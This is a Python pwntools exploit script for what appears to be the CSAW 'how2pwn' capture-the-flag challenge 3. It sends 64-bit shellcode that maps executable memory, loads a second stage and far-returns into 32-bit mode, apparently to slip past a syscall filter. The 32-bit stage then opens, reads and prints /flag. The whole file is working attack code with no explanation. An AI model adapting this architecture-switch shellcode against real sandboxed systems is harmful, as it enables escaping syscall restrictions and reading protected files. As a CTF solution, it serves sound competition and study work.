from pwn import *
# context.log_level='debug'
debug = 0
if debug:
    p = process("./chal3")
else:
    p = remote("how2pwn.chal.csaw.io",60003)
    # p = remote("0.0.0.0", 60003)
with open("./ticket3",'r') as f:
    ticket = f.read().strip()
p.send(ticket)


context.arch = 'amd64'
shellcode = f'''
xor rax,rax
mov al,0x9
mov rdi,0xcafe0000
mov rsi,0x2000
mov rdx,0x7
mov r10,0x21
xor r8,r8
xor r9,r9
syscall

xor rdi,rdi
mov rsi,rax
xor rdx,rdx
inc rdx
shl rdx,8
xor rax,rax
syscall

mov rax,0x2300000000
xor rsi,rax
push rsi
'''
# retf

# gdb.attach(p)
shellcode = asm(shellcode)+b'\xcb'
print("[+] len of shellcode: "+str(len(shellcode)))
p.sendafter(": \n",shellcode.ljust(0x100,b'\0'))

context.arch='i386'
context.bits=32
flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))
shellcode=f'''
mov esp, 0xcafe0100
xor eax,eax
mov al,0x5
push {flag_path_2}
push {flag_path_1}
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80
mov ebx,eax
mov al,0x3
mov ecx,0xcafe0400
mov edx,0x1c00
int 0x80
mov eax,0x4
mov ebx,0x1
mov edx,0x1c00
int 0x80
'''
# input()
shellcode = asm(shellcode)
print("[+] len of shellcode: "+str(len(shellcode)))

p.send(shellcode)
# while(1):
#     flag = p.read()
#     print(flag)
#     if b"Segmentation fault\n" in flag:
#         break
p.interactive()
p.close()
